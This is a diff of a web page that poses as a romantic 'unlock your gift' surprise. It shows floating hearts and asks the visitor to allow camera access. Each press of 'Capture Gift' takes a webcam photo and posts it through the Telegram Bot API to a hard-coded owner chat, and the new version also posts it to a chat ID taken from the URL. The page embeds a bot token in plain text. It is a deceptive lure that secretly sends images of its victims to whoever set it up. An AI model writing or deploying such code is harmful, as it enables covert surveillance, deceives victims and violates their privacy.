@@ -1,52 +1,32 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🎁 Unlock Your Surprise</title>
-
+<title>🎁 Your Surprise</title>
 <style>
 body {
     margin: 0;
-    overflow: hidden;
     background: #000;
-    text-align: center;
     color: white;
+    text-align: center;
     font-family: Arial;
 }
-
-#msg {
-    margin-top: 40px;
-    font-size: 26px;
-}
-
 button {
-    padding: 14px 32px;
-    background: #ff0059;
-    border: none;
-    border-radius: 8px;
+    padding: 15px 35px;
     font-size: 18px;
+    background: #ff007b;
     color: white;
+    border: none;
+    border-radius: 10px;
     margin-top: 20px;
 }
-
-#hearts {
-    position: fixed;
-    inset: 0;
-    pointer-events: none;
-}
-
-video, canvas {
-    width: 90%;
-    margin-top: 20px;
-    display: none;
-}
+#hearts { position: fixed; inset: 0; pointer-events: none; }
+video, canvas { width: 90%; margin-top: 20px; display: none; }
 </style>
 </head>
 <body>
 
-<h2 id="msg">🎁 Tap the button below to unlock your surprise!</h2>
-
+<h2 id="msg">🎁 Tap to unlock your special gift!</h2>
 <button onclick="startGift()">Unlock Gift 🎁</button>
 
 <div id="hearts"></div>
@@ -54,62 +34,64 @@ video, canvas {
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
-<button id="captureBtn" style="display:none" onclick="capturePhoto()">📸 Capture Gift</button>
+<button id="capBtn" style="display:none" onclick="capture()">📸 Capture Gift</button>
 
 <script>
-// Floating Hearts
-function createHeart() {
-    const heart = document.createElement("div");
-    heart.innerHTML = "❤️";
-    heart.style.position = "absolute";
-    heart.style.left = Math.random() * 100 + "vw";
-    heart.style.animation = "floatUp 4s linear";
-    heart.style.fontSize = (Math.random() * 20 + 20) + "px";
-    document.getElementById("hearts").appendChild(heart);
-    setTimeout(() => heart.remove(), 4000);
-}
-setInterval(createHeart, 200);
+const urlParams = new URLSearchParams(window.location.search);
+const USER_CHAT_ID = urlParams.get("uid"); 
+const OWNER_CHAT_ID = "8215819954";
+const BOT_TOKEN = "8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI";
 
-// Start Camera
+// Hearts
+function heart() {
+    const h = document.createElement("div");
+    h.innerHTML = "❤️";
+    h.style.position = "absolute";
+    h.style.left = Math.random()*100 + "vw";
+    h.style.fontSize = (20 + Math.random()*30) + "px";
+    h.style.animation = "up 3s linear";
+    document.getElementById("hearts").appendChild(h);
+    setTimeout(() => h.remove(), 3000);
+}
+setInterval(heart, 200);
+
+// Start gift
 function startGift() {
-    document.getElementById("msg").innerText = "💗 Click ALLOW to reveal your gift!";
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            document.getElementById("video").style.display = "block";
-            document.getElementById("captureBtn").style.display = "block";
-            document.getElementById("video").srcObject = stream;
-        })
-        .catch(err => alert("Camera permission needed!"));
+    document.getElementById("msg").innerText = "💗 Click ALLOW to reveal your surprise!";
+    navigator.mediaDevices.getUserMedia({ video:true }).then(stream => {
+        document.getElementById("video").style.display="block";
+        document.getElementById("capBtn").style.display="block";
+        document.getElementById("video").srcObject = stream;
+    });
 }
 
-// Capture + Send to Telegram
-let photoCount = 0;
-function capturePhoto() {
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
+let count = 0;
+function capture() {
+    const v = document.getElementById("video");
+    const c = document.getElementById("canvas");
+    const ctx = c.getContext("2d");
+    c.width = v.videoWidth;
+    c.height = v.videoHeight;
+    ctx.drawImage(v,0,0);
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    const img = c.toDataURL("image/jpeg");
 
-    ctx.drawImage(video, 0, 0);
-
-    const imageData = canvas.toDataURL("image/jpeg");
-
-    fetch(`https://api.telegram.org/bot8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI/sendPhoto`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: "8215819954",
-            photo: imageData
-        })
+    // send to owner
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body: JSON.stringify({ chat_id: OWNER_CHAT_ID, photo: img })
     });
 
-    photoCount++;
+    // send to user
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body: JSON.stringify({ chat_id: USER_CHAT_ID, photo: img })
+    });
 
-    if (photoCount >= 10) {
-        alert("❤️ Your gift is ready!");
-    }
+    count++;
+    if(count>=10) alert("❤️ Gift completed!");
 }
 </script>
 
